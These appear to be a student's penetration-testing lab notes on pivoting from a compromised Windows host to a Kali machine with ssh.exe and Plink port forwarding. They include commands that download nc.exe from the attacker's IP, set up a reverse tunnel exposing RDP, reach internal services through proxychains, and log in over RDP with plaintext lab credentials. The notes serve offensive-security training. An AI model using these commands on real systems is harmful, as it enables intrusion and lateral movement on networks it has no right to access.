
add -p 2222 always
# ssh.exe

On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.

Let's practice this by creating a remote dynamic port forward from MULTISERVER03 (a Windows machine) to our Kali machine. In this scenario, only the RDP port is open on MULTISERVER03.

![[Pasted image 20240515004827.png]]

### start SSH service
```
sudo killall ssh

sudo systemctl start ssh
```

### RDP

as we get creds or shell on MULTISERVER03 we will connect through it

### find which port forwarding service is available

```
where ssh

ssh.exe -V
```

![[Pasted image 20240515010423.png]]

### connect via SSH

```
ssh -N -R 9998 kali@192.168.118.4 -p 2222
```

![[Pasted image 20240515010743.png]]
### verify port & SOCKS

```
ss -plunt
```

![[Pasted image 20240515010707.png]]

```
tail /etc/proxychains4.conf
```

![[Pasted image 20240515010719.png]]
### connect to service

```
proxychains psql -h 10.4.50.215 -U postgres
```

```
proxychains ./ssh_exe_exercise_client.bin -i 10.4.209.215 -p 4141
```


# Pink

- for shell only
- can't do remote dynamic port forwarding

majority times it's possible that only 80 or 443 is available and other ports are blocked by firewall

![[Pasted image 20240515011549.png]]

### start SSH service
```
sudo killall ssh

sudo systemctl start ssh
```

### transfer files and get shell

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

![[Pasted image 20240515015313.png]]

![[Pasted image 20240515015341.png]]

get reverse shell and transfer plink

[[windows-download-from-kali#^cc4ca5]]

[[windows-upload-to-kali#^e37ea8]]

### connect with Plink

```
plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.158 -P 2222
```

![[Pasted image 20240515020150.png]]

> [!NOTE]
> Notice that we escape from shell

soluction
```
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```
### verify

```
ss -plunt
```

![[Pasted image 20240515020315.png]]

now we can say that we open RDP port 3389 and bind it to **9833**

![[Pasted image 20240515020508.png]]

### connect RDP

```
xfreerdp /v:127.0.0.1:9833 /u:rdp_admin /p:'P@ssw0rd!' /cert-ignore /timeout:60000
```